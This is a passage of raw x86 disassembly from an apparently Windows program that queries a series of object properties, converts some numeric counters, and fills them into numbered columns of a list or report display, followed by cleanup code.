  402707:	lea    ecx,[ebp-0x80]
  40270a:	call   DWORD PTR ds:0x4121c0
  402710:	xor    eax,eax
  402712:	fwait
  402713:	jmp    0x403266
  402718:	fwait
  402719:	push   0x13
  40271b:	pop    edi
  40271c:	mov    DWORD PTR [ebp-0x4],edi
  40271f:	mov    edx,DWORD PTR [ebx+0x44]
  402722:	mov    ecx,DWORD PTR [ebp-0xc4]
  402728:	call   0x4070c8
  40272d:	test   eax,eax
  40272f:	jns    0x402762
  402731:	mov    ecx,eax
  402733:	call   0x407454
  402738:	mov    ecx,DWORD PTR [ebp-0xc4]
  40273e:	test   ecx,ecx
  402740:	je     0x402759
  402742:	mov    eax,DWORD PTR [ecx]
  402744:	push   ecx
  402745:	mov    esi,DWORD PTR [eax+0x8]
  402748:	mov    ecx,esi
  40274a:	call   DWORD PTR ds:0x41228c
  402750:	call   esi
  402752:	and    DWORD PTR [ebp-0xc4],0x0
  402759:	mov    BYTE PTR [ebp-0x4],0x12
  40275d:	jmp    0x40313d
  402762:	mov    eax,DWORD PTR [ebp-0xc4]
  402768:	mov    esi,DWORD PTR [eax]
  40276a:	lea    ecx,[ebp-0xfc]
  402770:	push   ecx
  402771:	lea    ecx,[ebp-0x64]
  402774:	push   ecx
  402775:	push   0x1
  402777:	push   0xffffffff
  402779:	push   eax
  40277a:	mov    ecx,DWORD PTR [esi+0x10]
  40277d:	call   DWORD PTR ds:0x41228c
  402783:	call   DWORD PTR [esi+0x10]
  402786:	mov    DWORD PTR [ebp-0x104],eax
  40278c:	test   eax,eax
  40278e:	js     0x402731
  402790:	mov    esi,0x138d
  402795:	mov    ecx,esi
  402797:	call   0x4098dc
  40279c:	push   eax
  40279d:	lea    eax,[ebp-0x84]
  4027a3:	push   eax
  4027a4:	mov    edx,0x4010e8
  4027a9:	mov    ecx,DWORD PTR [ebp-0x64]
  4027ac:	call   0x4078a4
  4027b1:	mov    ecx,esi
  4027b3:	call   0x4098dc
  4027b8:	push   eax
  4027b9:	lea    eax,[ebp-0x88]
  4027bf:	push   eax
  4027c0:	mov    edx,0x4010f8
  4027c5:	mov    ecx,DWORD PTR [ebp-0x64]
  4027c8:	call   0x4078a4
  4027cd:	mov    ecx,esi
  4027cf:	call   0x4098dc
  4027d4:	push   eax
  4027d5:	lea    eax,[ebp-0x68]
  4027d8:	push   eax
  4027d9:	mov    edx,0x401108
  4027de:	mov    ecx,DWORD PTR [ebp-0x64]
  4027e1:	call   0x4078a4
  4027e6:	mov    ecx,esi
  4027e8:	call   0x4098dc
  4027ed:	push   eax
  4027ee:	lea    eax,[ebp-0x7c]
  4027f1:	push   eax
  4027f2:	mov    edx,0x401118
  4027f7:	mov    ecx,DWORD PTR [ebp-0x64]
  4027fa:	call   0x4078a4
  4027ff:	mov    ecx,esi
  402801:	call   0x4098dc
  402806:	push   eax
  402807:	lea    eax,[ebp-0xa8]
  40280d:	push   eax
  40280e:	mov    edx,0x401130
  402813:	mov    ecx,DWORD PTR [ebp-0x64]
  402816:	call   0x4078a4
  40281b:	mov    ecx,esi
  40281d:	call   0x4098dc
  402822:	push   eax
  402823:	lea    eax,[ebp-0x9c]
  402829:	push   eax
  40282a:	mov    edx,0x401148
  40282f:	mov    ecx,DWORD PTR [ebp-0x64]
  402832:	call   0x4078a4
  402837:	mov    ecx,esi
  402839:	call   0x4098dc
  40283e:	push   eax
  40283f:	lea    eax,[ebp-0xa0]
  402845:	push   eax
  402846:	mov    edx,0x401164
  40284b:	mov    ecx,DWORD PTR [ebp-0x64]
  40284e:	call   0x4078a4
  402853:	mov    ecx,esi
  402855:	call   0x4098dc
  40285a:	push   eax
  40285b:	lea    eax,[ebp-0x94]
  402861:	push   eax
  402862:	mov    edx,0x401178
  402867:	mov    ecx,DWORD PTR [ebp-0x64]
  40286a:	call   0x4078a4
  40286f:	mov    ecx,esi
  402871:	call   0x4098dc
  402876:	push   eax
  402877:	lea    eax,[ebp-0xac]
  40287d:	push   eax
  40287e:	mov    edx,0x401198
  402883:	mov    ecx,DWORD PTR [ebp-0x64]
  402886:	call   0x4078a4
  40288b:	mov    ecx,esi
  40288d:	call   0x4098dc
  402892:	push   eax
  402893:	lea    eax,[ebp-0x8c]
  402899:	push   eax
  40289a:	mov    edx,0x4011b4
  40289f:	mov    ecx,DWORD PTR [ebp-0x64]
  4028a2:	call   0x4078a4
  4028a7:	mov    ecx,esi
  4028a9:	call   0x4098dc
  4028ae:	push   eax
  4028af:	lea    eax,[ebp-0xa4]
  4028b5:	push   eax
  4028b6:	mov    edx,0x4011d0
  4028bb:	mov    ecx,DWORD PTR [ebp-0x64]
  4028be:	call   0x4078a4
  4028c3:	mov    ecx,esi
  4028c5:	call   0x4098dc
  4028ca:	push   eax
  4028cb:	lea    eax,[ebp-0xb0]
  4028d1:	push   eax
  4028d2:	mov    edx,0x4011f4
  4028d7:	mov    ecx,DWORD PTR [ebp-0x64]
  4028da:	call   0x4078a4
  4028df:	mov    ecx,esi
  4028e1:	call   0x4098dc
  4028e6:	push   eax
  4028e7:	lea    eax,[ebp-0x98]
  4028ed:	push   eax
  4028ee:	mov    edx,0x401214
  4028f3:	mov    ecx,DWORD PTR [ebp-0x64]
  4028f6:	call   0x4078a4
  4028fb:	mov    ecx,esi
  4028fd:	call   0x4098dc
  402902:	push   eax
  402903:	lea    eax,[ebp-0x78]
  402906:	push   eax
  402907:	mov    edx,0x40122c
  40290c:	mov    ecx,DWORD PTR [ebp-0x64]
  40290f:	call   0x4078a4
  402914:	mov    ecx,esi
  402916:	call   0x4098dc
  40291b:	push   eax
  40291c:	lea    eax,[ebp-0x74]
  40291f:	push   eax
  402920:	mov    edx,0x40123c
  402925:	mov    ecx,DWORD PTR [ebp-0x64]
  402928:	call   0x4078a4
  40292d:	mov    ecx,esi
  40292f:	call   0x4098dc
  402934:	push   eax
  402935:	lea    eax,[ebp-0x6c]
  402938:	push   eax
  402939:	mov    edx,0x401264
  40293e:	mov    ecx,DWORD PTR [ebp-0x64]
  402941:	call   0x4078a4
  402946:	mov    ecx,esi
  402948:	call   0x4098dc
  40294d:	push   eax
  40294e:	lea    eax,[ebp-0x70]
  402951:	push   eax
  402952:	mov    edx,0x401294
  402957:	mov    ecx,DWORD PTR [ebp-0x64]
  40295a:	call   0x4078a4
  40295f:	lea    eax,[ebp-0x118]
  402965:	push   eax
  402966:	mov    edx,0x4012b8
  40296b:	mov    ecx,DWORD PTR [ebp-0x64]
  40296e:	call   0x407b91
  402973:	lea    eax,[ebp-0x128]
  402979:	push   eax
  40297a:	mov    edx,0x4012d0
  40297f:	mov    ecx,DWORD PTR [ebp-0x64]
  402982:	call   0x407b91
  402987:	push   ecx
  402988:	lea    eax,[ebx+0x48]
  40298b:	push   eax
  40298c:	mov    edx,0x4012f0
  402991:	mov    ecx,DWORD PTR [ebp-0x64]
  402994:	call   0x407a1b
  402999:	mov    ecx,DWORD PTR [ebp-0xc4]
  40299f:	test   ecx,ecx
  4029a1:	je     0x4029ba
  4029a3:	mov    eax,DWORD PTR [ecx]
  4029a5:	push   ecx
  4029a6:	mov    esi,DWORD PTR [eax+0x8]
  4029a9:	mov    ecx,esi
  4029ab:	call   DWORD PTR ds:0x41228c
  4029b1:	call   esi
  4029b3:	and    DWORD PTR [ebp-0xc4],0x0
  4029ba:	mov    ecx,DWORD PTR [ebp-0x64]
  4029bd:	test   ecx,ecx
  4029bf:	je     0x4029d5
  4029c1:	mov    eax,DWORD PTR [ecx]
  4029c3:	push   ecx
  4029c4:	mov    esi,DWORD PTR [eax+0x8]
  4029c7:	mov    ecx,esi
  4029c9:	call   DWORD PTR ds:0x41228c
  4029cf:	call   esi
  4029d1:	and    DWORD PTR [ebp-0x64],0x0
  4029d5:	lea    ecx,[ebp-0x78]
  4029d8:	call   0x405407
  4029dd:	mov    BYTE PTR [ebp-0x4],0x17
  4029e1:	fwait
  4029e2:	lea    ecx,[ebp-0xd0]
  4029e8:	call   DWORD PTR ds:0x4121c4
  4029ee:	mov    BYTE PTR [ebp-0x4],0x18
  4029f2:	lea    eax,[ebp-0x68]
  4029f5:	push   eax
  4029f6:	lea    ecx,[ebp-0xd0]
  4029fc:	call   DWORD PTR ds:0x4121bc
  402a02:	lea    ecx,[ebp-0x7c]
  402a05:	call   DWORD PTR ds:0x4121b8
  402a0b:	cmp    DWORD PTR [eax+0x4],0x0
  402a0f:	je     0x402a2c
  402a11:	push   DWORD PTR [ebp-0x7c]
  402a14:	push   DWORD PTR [ebp-0x68]
  402a17:	push   0x401334
  402a1c:	lea    eax,[ebp-0xd0]
  402a22:	push   eax
  402a23:	call   DWORD PTR ds:0x4121b4
  402a29:	add    esp,0x10
  402a2c:	push   DWORD PTR [ebp-0xa8]
  402a32:	push   DWORD PTR [ebp-0xd0]
  402a38:	push   0x67
  402a3a:	pop    ecx
  402a3b:	call   0x4098dc
  402a40:	push   eax
  402a41:	lea    eax,[ebp-0x68]
  402a44:	push   eax
  402a45:	call   DWORD PTR ds:0x4121b4
  402a4b:	add    esp,0x10
  402a4e:	mov    BYTE PTR [ebp-0x4],0x17
  402a52:	lea    ecx,[ebp-0xd0]
  402a58:	call   DWORD PTR ds:0x4121c0
  402a5e:	fwait
  402a5f:	mov    DWORD PTR [ebp-0x4],edi
  402a62:	lea    ecx,[ebp-0xcc]
  402a68:	call   DWORD PTR ds:0x4121c4
  402a6e:	mov    BYTE PTR [ebp-0x4],0x1a
  402a72:	lea    ecx,[ebp-0xd4]
  402a78:	call   DWORD PTR ds:0x4121c4
  402a7e:	mov    BYTE PTR [ebp-0x4],0x1b
  402a82:	sub    esp,0x10
  402a85:	lea    esi,[ebp-0x118]
  402a8b:	mov    edi,esp
  402a8d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  402a8e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  402a8f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  402a90:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  402a91:	lea    edx,[ebp-0xcc]
  402a97:	lea    ecx,[ebp-0xd4]
  402a9d:	call   0x4022d9
  402aa2:	mov    BYTE PTR [ebp-0x4],0x1c
  402aa6:	fwait
  402aa7:	push   DWORD PTR [ebp-0xcc]
  402aad:	push   DWORD PTR [ebp-0xd4]
  402ab3:	push   0x401340
  402ab8:	lea    eax,[ebp-0x80]
  402abb:	push   eax
  402abc:	call   DWORD PTR ds:0x4121b4
  402ac2:	add    esp,0x10
  402ac5:	fwait
  402ac6:	mov    DWORD PTR [ebp-0x4],0x1a
  402acd:	lea    ecx,[ebp-0xd4]
  402ad3:	call   DWORD PTR ds:0x4121c0
  402ad9:	mov    BYTE PTR [ebp-0x4],0x13
  402add:	lea    ecx,[ebp-0xcc]
  402ae3:	call   DWORD PTR ds:0x4121c0
  402ae9:	lea    ecx,[ebp-0xdc]
  402aef:	call   DWORD PTR ds:0x4121c4
  402af5:	mov    BYTE PTR [ebp-0x4],0x1e
  402af9:	lea    ecx,[ebp-0xd8]
  402aff:	call   DWORD PTR ds:0x4121c4
  402b05:	mov    BYTE PTR [ebp-0x4],0x1f
  402b09:	lea    ecx,[ebp-0xc8]
  402b0f:	call   DWORD PTR ds:0x4121c4
  402b15:	mov    BYTE PTR [ebp-0x4],0x20
  402b19:	sub    esp,0x10
  402b1c:	lea    esi,[ebp-0x128]
  402b22:	mov    edi,esp
  402b24:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  402b25:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  402b26:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  402b27:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  402b28:	lea    edx,[ebp-0xdc]
  402b2e:	lea    ecx,[ebp-0xd8]
  402b34:	call   0x4022d9
  402b39:	mov    BYTE PTR [ebp-0x4],0x21
  402b3d:	fwait
  402b3e:	push   DWORD PTR [ebp-0xdc]
  402b44:	push   DWORD PTR [ebp-0xd8]
  402b4a:	push   0x401340
  402b4f:	lea    eax,[ebp-0xc8]
  402b55:	push   eax
  402b56:	call   DWORD PTR ds:0x4121b4
  402b5c:	add    esp,0x10
  402b5f:	fwait
  402b60:	mov    DWORD PTR [ebp-0x4],0x20
  402b67:	push   ecx
  402b68:	push   DWORD PTR [ebp-0xc8]
  402b6e:	push   0xa
  402b70:	xor    edx,edx
  402b72:	mov    ecx,DWORD PTR [ebx+0x30]
  402b75:	call   0x40b94a
  402b7a:	mov    BYTE PTR [ebp-0x4],0x1f
  402b7e:	lea    ecx,[ebp-0xc8]
  402b84:	call   DWORD PTR ds:0x4121c0
  402b8a:	mov    BYTE PTR [ebp-0x4],0x1e
  402b8e:	lea    ecx,[ebp-0xd8]
  402b94:	call   DWORD PTR ds:0x4121c0
  402b9a:	mov    BYTE PTR [ebp-0x4],0x13
  402b9e:	lea    ecx,[ebp-0xdc]
  402ba4:	call   DWORD PTR ds:0x4121c0
  402baa:	mov    BYTE PTR [ebp-0x4],0x23
  402bae:	fwait
  402baf:	lea    ecx,[ebp-0xb4]
  402bb5:	call   DWORD PTR ds:0x4121c4
  402bbb:	mov    BYTE PTR [ebp-0x4],0x24
  402bbf:	and    DWORD PTR [ebp-0x60],0x0
  402bc3:	push   0x3e
  402bc5:	push   0x0
  402bc7:	lea    eax,[ebp-0x5c]
  402bca:	push   eax
  402bcb:	call   0x40eb54
  402bd0:	add    esp,0xc
  402bd3:	push   DWORD PTR [ebp-0x70]
  402bd6:	call   DWORD PTR ds:0x412240
  402bdc:	pop    ecx
  402bdd:	mov    DWORD PTR [ebp-0xe8],eax
  402be3:	mov    DWORD PTR [ebp-0xe4],edx
  402be9:	fild   QWORD PTR [ebp-0xe8]
  402bef:	fstp   DWORD PTR [ebp-0xbc]
  402bf5:	fld    DWORD PTR [ebp-0xbc]
  402bfb:	fmul   QWORD PTR ds:0x401c40
  402c01:	fadd   QWORD PTR ds:0x401c48
  402c07:	xor    edi,edi
  402c09:	xor    ecx,ecx
  402c0b:	mov    DWORD PTR [ebp-0xbc],ecx
  402c11:	fld    QWORD PTR ds:0x401c50
  402c17:	fcom   st(1)
  402c19:	fnstsw ax
  402c1b:	test   ah,0x41
  402c1e:	jp     0x402c3c
  402c20:	fsub   st(1),st
  402c22:	fcomp  st(1)
  402c24:	fnstsw ax
  402c26:	test   ah,0x41
  402c29:	jne    0x402c3e
  402c2b:	add    edi,ecx
  402c2d:	mov    esi,0x80000000
  402c32:	adc    ecx,esi
  402c34:	mov    DWORD PTR [ebp-0xbc],ecx
  402c3a:	jmp    0x402c43
  402c3c:	fstp   st(0)
  402c3e:	mov    esi,0x80000000
  402c43:	call   0x40eb3c
  402c48:	add    eax,edi
  402c4a:	adc    edx,DWORD PTR [ebp-0xbc]
  402c50:	mov    DWORD PTR [ebp-0xe8],eax
  402c56:	mov    DWORD PTR [ebp-0xe4],edx
  402c5c:	push   DWORD PTR [ebp-0x6c]
  402c5f:	call   DWORD PTR ds:0x412240
  402c65:	pop    ecx
  402c66:	mov    DWORD PTR [ebp-0xc0],eax
  402c6c:	mov    DWORD PTR [ebp-0xbc],edx
  402c72:	fild   QWORD PTR [ebp-0xc0]
  402c78:	fstp   DWORD PTR [ebp-0xbc]
  402c7e:	fld    DWORD PTR [ebp-0xbc]
  402c84:	fmul   QWORD PTR ds:0x401c40
  402c8a:	fadd   QWORD PTR ds:0x401c48
  402c90:	xor    edi,edi
  402c92:	xor    ecx,ecx
  402c94:	mov    DWORD PTR [ebp-0xbc],ecx
  402c9a:	fld    QWORD PTR ds:0x401c50
  402ca0:	fcom   st(1)
  402ca2:	fnstsw ax
  402ca4:	test   ah,0x41
  402ca7:	jp     0x402cc0
  402ca9:	fsub   st(1),st
  402cab:	fcomp  st(1)
  402cad:	fnstsw ax
  402caf:	test   ah,0x41
  402cb2:	jne    0x402cc2
  402cb4:	add    edi,ecx
  402cb6:	adc    ecx,esi
  402cb8:	mov    DWORD PTR [ebp-0xbc],ecx
  402cbe:	jmp    0x402cc2
  402cc0:	fstp   st(0)
  402cc2:	call   0x40eb3c
  402cc7:	add    eax,edi
  402cc9:	adc    edx,DWORD PTR [ebp-0xbc]
  402ccf:	mov    DWORD PTR [ebp-0xf8],eax
  402cd5:	mov    DWORD PTR [ebp-0xf4],edx
  402cdb:	push   DWORD PTR [ebp-0x74]
  402cde:	call   DWORD PTR ds:0x412240
  402ce4:	pop    ecx
  402ce5:	mov    DWORD PTR [ebp-0xc0],eax
  402ceb:	mov    DWORD PTR [ebp-0xbc],edx
  402cf1:	fild   QWORD PTR [ebp-0xc0]
  402cf7:	fstp   DWORD PTR [ebp-0xbc]
  402cfd:	fld    DWORD PTR [ebp-0xbc]
  402d03:	fmul   QWORD PTR ds:0x401c40
  402d09:	fadd   QWORD PTR ds:0x401c48
  402d0f:	xor    edi,edi
  402d11:	xor    ecx,ecx
  402d13:	mov    DWORD PTR [ebp-0xbc],ecx
  402d19:	fld    QWORD PTR ds:0x401c50
  402d1f:	fcom   st(1)
  402d21:	fnstsw ax
  402d23:	test   ah,0x41
  402d26:	jp     0x402d3f
  402d28:	fsub   st(1),st
  402d2a:	fcomp  st(1)
  402d2c:	fnstsw ax
  402d2e:	test   ah,0x41
  402d31:	jne    0x402d41
  402d33:	add    edi,ecx
  402d35:	adc    ecx,esi
  402d37:	mov    DWORD PTR [ebp-0xbc],ecx
  402d3d:	jmp    0x402d41
  402d3f:	fstp   st(0)
  402d41:	call   0x40eb3c
  402d46:	mov    esi,eax
  402d48:	mov    eax,edx
  402d4a:	add    esi,edi
  402d4c:	adc    eax,DWORD PTR [ebp-0xbc]
  402d52:	mov    DWORD PTR [ebp-0xec],eax
  402d58:	mov    ecx,DWORD PTR [ebp-0xf8]
  402d5e:	sub    ecx,DWORD PTR [ebp-0xe8]
  402d64:	mov    eax,DWORD PTR [ebp-0xf4]
  402d6a:	sbb    eax,DWORD PTR [ebp-0xe4]
  402d70:	push   0xa
  402d72:	lea    edx,[ebp-0x60]
  402d75:	push   edx
  402d76:	push   eax
  402d77:	push   ecx
  402d78:	call   DWORD PTR ds:0x41223c
  402d7e:	add    esp,0x10
  402d81:	lea    edx,[ebp-0xb4]
  402d87:	lea    ecx,[ebp-0x60]
  402d8a:	call   0x40561a
  402d8f:	test   eax,eax
  402d91:	jne    0x402da8
  402d93:	mov    BYTE PTR [ebp-0x4],0x23
  402d97:	lea    ecx,[ebp-0xb4]
  402d9d:	call   DWORD PTR ds:0x4121c0
  402da3:	jmp    0x4025e5
  402da8:	push   DWORD PTR [ebp-0xb4]
  402dae:	push   0x68
  402db0:	pop    edi
  402db1:	mov    ecx,edi
  402db3:	call   0x4098dc
  402db8:	push   eax
  402db9:	lea    eax,[ebp-0x90]
  402dbf:	push   eax
  402dc0:	call   DWORD PTR ds:0x4121b4
  402dc6:	add    esp,0xc
  402dc9:	push   0xa
  402dcb:	lea    eax,[ebp-0x60]
  402dce:	push   eax
  402dcf:	push   DWORD PTR [ebp-0xec]
  402dd5:	push   esi
  402dd6:	call   DWORD PTR ds:0x41223c
  402ddc:	add    esp,0x10
  402ddf:	lea    edx,[ebp-0xb4]
  402de5:	lea    ecx,[ebp-0x60]
  402de8:	call   0x40561a
  402ded:	test   eax,eax
  402def:	je     0x402d93
  402df1:	push   DWORD PTR [ebp-0xb4]
  402df7:	mov    ecx,edi
  402df9:	call   0x4098dc
  402dfe:	push   eax
  402dff:	lea    eax,[ebp-0x74]
  402e02:	push   eax
  402e03:	call   DWORD PTR ds:0x4121b4
  402e09:	add    esp,0xc
  402e0c:	push   0xa
  402e0e:	lea    eax,[ebp-0x60]
  402e11:	push   eax
  402e12:	push   DWORD PTR [ebp-0xf4]
  402e18:	push   DWORD PTR [ebp-0xf8]
  402e1e:	call   DWORD PTR ds:0x41223c
  402e24:	add    esp,0x10
  402e27:	lea    edx,[ebp-0xb4]
  402e2d:	lea    ecx,[ebp-0x60]
  402e30:	call   0x40561a
  402e35:	test   eax,eax
  402e37:	je     0x402d93
  402e3d:	push   DWORD PTR [ebp-0xb4]
  402e43:	mov    ecx,edi
  402e45:	call   0x4098dc
  402e4a:	push   eax
  402e4b:	lea    eax,[ebp-0x6c]
  402e4e:	push   eax
  402e4f:	call   DWORD PTR ds:0x4121b4
  402e55:	add    esp,0xc
  402e58:	push   0xa
  402e5a:	lea    eax,[ebp-0x60]
  402e5d:	push   eax
  402e5e:	push   DWORD PTR [ebp-0xe4]
  402e64:	push   DWORD PTR [ebp-0xe8]
  402e6a:	call   DWORD PTR ds:0x41223c
  402e70:	add    esp,0x10
  402e73:	lea    edx,[ebp-0xb4]
  402e79:	lea    ecx,[ebp-0x60]
  402e7c:	call   0x40561a
  402e81:	test   eax,eax
  402e83:	je     0x402d93
  402e89:	push   DWORD PTR [ebp-0xb4]
  402e8f:	mov    ecx,edi
  402e91:	call   0x4098dc
  402e96:	push   eax
  402e97:	lea    eax,[ebp-0x70]
  402e9a:	push   eax
  402e9b:	call   DWORD PTR ds:0x4121b4
  402ea1:	add    esp,0xc
  402ea4:	mov    BYTE PTR [ebp-0x4],0x23
  402ea8:	lea    ecx,[ebp-0xb4]
  402eae:	call   DWORD PTR ds:0x4121c0
  402eb4:	fwait
  402eb5:	mov    DWORD PTR [ebp-0x4],0x13
  402ebc:	push   ecx
  402ebd:	push   DWORD PTR [ebp-0x88]
  402ec3:	push   0x0
  402ec5:	xor    edx,edx
  402ec7:	mov    ecx,DWORD PTR [ebx+0x30]
  402eca:	call   0x40b94a
  402ecf:	push   ecx
  402ed0:	push   DWORD PTR [ebp-0x84]
  402ed6:	push   0x1
  402ed8:	xor    edx,edx
  402eda:	mov    ecx,DWORD PTR [ebx+0x30]
  402edd:	call   0x40b94a
  402ee2:	push   ecx
  402ee3:	push   DWORD PTR [ebp-0x68]
  402ee6:	push   0x2
  402ee8:	xor    edx,edx
  402eea:	mov    ecx,DWORD PTR [ebx+0x30]
  402eed:	call   0x40b94a
  402ef2:	push   ecx
  402ef3:	push   DWORD PTR [ebp-0x9c]
  402ef9:	push   0x3
  402efb:	xor    edx,edx
  402efd:	mov    ecx,DWORD PTR [ebx+0x30]
  402f00:	call   0x40b94a
  402f05:	push   ecx
  402f06:	push   DWORD PTR [ebp-0xa0]
  402f0c:	push   0x5
  402f0e:	xor    edx,edx
  402f10:	mov    ecx,DWORD PTR [ebx+0x30]
  402f13:	call   0x40b94a
  402f18:	push   ecx
  402f19:	push   DWORD PTR [ebp-0x94]
  402f1f:	push   0x6
  402f21:	xor    edx,edx
  402f23:	mov    ecx,DWORD PTR [ebx+0x30]
  402f26:	call   0x40b94a
  402f2b:	push   ecx
  402f2c:	push   DWORD PTR [ebp-0xac]
  402f32:	push   0x7
  402f34:	xor    edx,edx
  402f36:	mov    ecx,DWORD PTR [ebx+0x30]
  402f39:	call   0x40b94a
  402f3e:	push   ecx
  402f3f:	push   DWORD PTR [ebp-0x8c]
  402f45:	push   0x8
  402f47:	xor    edx,edx
  402f49:	mov    ecx,DWORD PTR [ebx+0x30]
  402f4c:	call   0x40b94a
  402f51:	push   ecx
  402f52:	push   DWORD PTR [ebp-0x80]
  402f55:	push   0x9
  402f57:	xor    edx,edx
  402f59:	mov    ecx,DWORD PTR [ebx+0x30]
  402f5c:	call   0x40b94a
  402f61:	push   ecx
  402f62:	push   DWORD PTR [ebp-0xa4]
  402f68:	push   0x10
  402f6a:	xor    edx,edx
  402f6c:	mov    ecx,DWORD PTR [ebx+0x30]
  402f6f:	call   0x40b94a
  402f74:	push   ecx
  402f75:	push   DWORD PTR [ebp-0xb0]
  402f7b:	push   0x11
  402f7d:	xor    edx,edx
  402f7f:	mov    ecx,DWORD PTR [ebx+0x30]
  402f82:	call   0x40b94a
  402f87:	push   ecx
  402f88:	push   DWORD PTR [ebp-0x98]
  402f8e:	push   0x12
  402f90:	xor    edx,edx
  402f92:	mov    ecx,DWORD PTR [ebx+0x30]
  402f95:	call   0x40b94a
  402f9a:	push   ecx
  402f9b:	push   DWORD PTR [ebp-0x78]
  402f9e:	push   0x13
  402fa0:	xor    edx,edx
  402fa2:	mov    ecx,DWORD PTR [ebx+0x30]
  402fa5:	call   0x40b94a
  402faa:	push   ecx
  402fab:	push   DWORD PTR [ebp-0x74]
  402fae:	push   0x17
  402fb0:	xor    edx,edx
  402fb2:	mov    ecx,DWORD PTR [ebx+0x30]
  402fb5:	call   0x40b94a
  402fba:	push   ecx
  402fbb:	push   DWORD PTR [ebp-0x6c]
  402fbe:	push   0x18
  402fc0:	xor    edx,edx
  402fc2:	mov    ecx,DWORD PTR [ebx+0x30]
  402fc5:	call   0x40b94a
  402fca:	push   ecx
  402fcb:	push   DWORD PTR [ebp-0x70]
  402fce:	push   0x19
  402fd0:	xor    edx,edx
  402fd2:	mov    ecx,DWORD PTR [ebx+0x30]
  402fd5:	call   0x40b94a
  402fda:	push   ecx
  402fdb:	push   DWORD PTR [ebp-0x90]
  402fe1:	push   0x1a
  402fe3:	xor    edx,edx
  402fe5:	mov    ecx,DWORD PTR [ebx+0x30]
  402fe8:	call   0x40b94a
  402fed:	mov    BYTE PTR [ebp-0x4],0x12
  402ff1:	lea    ecx,[ebp-0xb8]
  402ff7:	call   DWORD PTR ds:0x4121c0
  402ffd:	mov    BYTE PTR [ebp-0x4],0x11
  403001:	lea    ecx,[ebp-0x78]
  403004:	call   DWORD PTR ds:0x4121c0
  40300a:	mov    BYTE PTR [ebp-0x4],0x10
  40300e:	lea    ecx,[ebp-0x70]
  403011:	call   DWORD PTR ds:0x4121c0
  403017:	mov    BYTE PTR [ebp-0x4],0xf
  40301b:	lea    ecx,[ebp-0x6c]
  40301e:	call   DWORD PTR ds:0x4121c0
  403024:	mov    BYTE PTR [ebp-0x4],0xe
  403028:	lea    ecx,[ebp-0x74]
  40302b:	call   DWORD PTR ds:0x4121c0
  403031:	mov    BYTE PTR [ebp-0x4],0xd
  403035:	lea    ecx,[ebp-0x98]
  40303b:	call   DWORD PTR ds:0x4121c0
  403041:	mov    BYTE PTR [ebp-0x4],0xc
  403045:	lea    ecx,[ebp-0xb0]
  40304b:	call   DWORD PTR ds:0x4121c0
  403051:	mov    BYTE PTR [ebp-0x4],0xb
  403055:	lea    ecx,[ebp-0xa4]
  40305b:	call   DWORD PTR ds:0x4121c0
  403061:	mov    BYTE PTR [ebp-0x4],0xa
  403065:	lea    ecx,[ebp-0x8c]
  40306b:	call   DWORD PTR ds:0x4121c0
  403071:	mov    BYTE PTR [ebp-0x4],0x9
  403075:	lea    ecx,[ebp-0xac]
  40307b:	call   DWORD PTR ds:0x4121c0
  403081:	mov    BYTE PTR [ebp-0x4],0x8
  403085:	lea    ecx,[ebp-0x94]
  40308b:	call   DWORD PTR ds:0x4121c0
  403091:	mov    BYTE PTR [ebp-0x4],0x7
  403095:	lea    ecx,[ebp-0xa0]
  40309b:	call   DWORD PTR ds:0x4121c0
  4030a1:	mov    BYTE PTR [ebp-0x4],0x6
  4030a5:	lea    ecx,[ebp-0x9c]
  4030ab:	call   DWORD PTR ds:0x4121c0
  4030b1:	mov    BYTE PTR [ebp-0x4],0x5
  4030b5:	lea    ecx,[ebp-0xa8]
  4030bb:	call   DWORD PTR ds:0x4121c0
  4030c1:	mov    BYTE PTR [ebp-0x4],0x4
  4030c5:	lea    ecx,[ebp-0x7c]
  4030c8:	call   DWORD PTR ds:0x4121c0
  4030ce:	mov    BYTE PTR [ebp-0x4],0x3
  4030d2:	lea    ecx,[ebp-0x68]
  4030d5:	call   DWORD PTR ds:0x4121c0
  4030db:	mov    BYTE PTR [ebp-0x4],0x2
  4030df:	lea    ecx,[ebp-0x84]
  4030e5:	call   DWORD PTR ds:0x4121c0
  4030eb:	mov    BYTE PTR [ebp-0x4],0x1
  4030ef:	lea    ecx,[ebp-0x88]
  4030f5:	call   DWORD PTR ds:0x4121c0
  4030fb:	mov    BYTE PTR [ebp-0x4],0x0
  4030ff:	lea    ecx,[ebp-0x90]
  403105:	call   DWORD PTR ds:0x4121c0
  40310b:	or     DWORD PTR [ebp-0x4],0xffffffff
  40310f:	lea    ecx,[ebp-0x80]
  403112:	call   DWORD PTR ds:0x4121c0
  403118:	xor    eax,eax
  40311a:	inc    eax
  40311b:	jmp    0x403266
  403120:	push   0x8007000e
  403125:	call   DWORD PTR ds:0x412014
  40312b:	call   0x4095c0
  403130:	mov    eax,0x403136
  403135:	ret    
  403136:	mov    DWORD PTR [ebp-0x4],0x12
  40313d:	lea    ecx,[ebp-0xb8]
  403143:	call   DWORD PTR ds:0x4121c0
  403149:	mov    BYTE PTR [ebp-0x4],0x11
  40314d:	lea    ecx,[ebp-0x78]
  403150:	call   DWORD PTR ds:0x4121c0
  403156:	mov    BYTE PTR [ebp-0x4],0x10
  40315a:	lea    ecx,[ebp-0x70]
  40315d:	call   DWORD PTR ds:0x4121c0
  403163:	mov    BYTE PTR [ebp-0x4],0xf
  403167:	lea    ecx,[ebp-0x6c]
  40316a:	call   DWORD PTR ds:0x4121c0
  403170:	mov    BYTE PTR [ebp-0x4],0xe
  403174:	lea    ecx,[ebp-0x74]
  403177:	call   DWORD PTR ds:0x4121c0
  40317d:	mov    BYTE PTR [ebp-0x4],0xd
  403181:	lea    ecx,[ebp-0x98]
  403187:	call   DWORD PTR ds:0x4121c0
  40318d:	mov    BYTE PTR [ebp-0x4],0xc
  403191:	lea    ecx,[ebp-0xb0]
  403197:	call   DWORD PTR ds:0x4121c0
  40319d:	mov    BYTE PTR [ebp-0x4],0xb
  4031a1:	lea    ecx,[ebp-0xa4]
  4031a7:	call   DWORD PTR ds:0x4121c0
  4031ad:	mov    BYTE PTR [ebp-0x4],0xa
  4031b1:	lea    ecx,[ebp-0x8c]
